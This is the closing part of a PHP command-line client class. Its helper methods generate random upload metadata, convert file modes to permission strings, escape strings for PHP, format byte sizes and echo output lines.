    {
        $types = array(
            array('extension' => 'png', 'content_type' => 'image/png'),
            array('extension' => 'jpg', 'content_type' => 'image/jpeg'),
            array('extension' => 'gif', 'content_type' => 'image/gif'),
            array('extension' => 'pdf', 'content_type' => 'application/pdf'),
            array('extension' => 'doc', 'content_type' => 'application/vnd.ms-word'),
            array('extension' => 'xls', 'content_type' => 'application/vnd.ms-excel'),
            array('extension' => 'txt', 'content_type' => 'text/plain')
        );

        $data = $types[rand(0, count($types) - 1)];

        return array(
            'input'        => $this->getRandomString(5, 11),
            'name'         => $this->getRandomString(5, 11).'.'.$data['extension'],
            'content_type' => $data['content_type']
        );
    }

    private function octToHumanPerms($mode)
    {
        // http://php.net/manual/en/function.stat.php
        $mode = (int)$mode;

        $ts=array(
            0140000 => 'ssocket',
            0120000 => 'llink',
            0100000 => '-file',
            0060000 => 'bblock',
            0040000 => 'ddir',
            0020000 => 'cchar',
            0010000 => 'pfifo'
        );

        $t = decoct($mode & 0170000); // File Encoding Bit

        $str  = (array_key_exists(octdec($t),$ts))?$ts[octdec($t)]{0}:'u';
        $str .= (($mode&0x0100)?'r':'-').(($mode&0x0080)?'w':'-');
        $str .= (($mode&0x0040)?(($mode&0x0800)?'s':'x'):(($mode&0x0800)?'S':'-'));
        $str .= (($mode&0x0020)?'r':'-').(($mode&0x0010)?'w':'-');
        $str .= (($mode&0x0008)?(($mode&0x0400)?'s':'x'):(($mode&0x0400)?'S':'-'));
        $str .= (($mode&0x0004)?'r':'-').(($mode&0x0002)?'w':'-');
        $str .= (($mode&0x0001)?(($mode&0x0200)?'t':'x'):(($mode&0x0200)?'T':'-'));

        return $str;
    }

    private function escapePHP($string)
    {
        return str_replace(array('+', '%'), array(' ', '\\x'), urlencode($string));
    }

    private function formatBytes($bytes, $precision = 2) { 
        $units = array('B', 'K', 'M', 'G', 'T', 'P'); 

        $bytes = max($bytes, 0); 
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); 
        $pow = min($pow, count($units) - 1); 

        $bytes /= pow(1024, $pow);
        // $bytes /= (1 << (10 * $pow)); 

        return round($bytes, $precision).$units[$pow]; 
    }

    private function callbackCommandGenericFlush($line)
    {
        echo $line;
    }
}

$client = new Client($argv);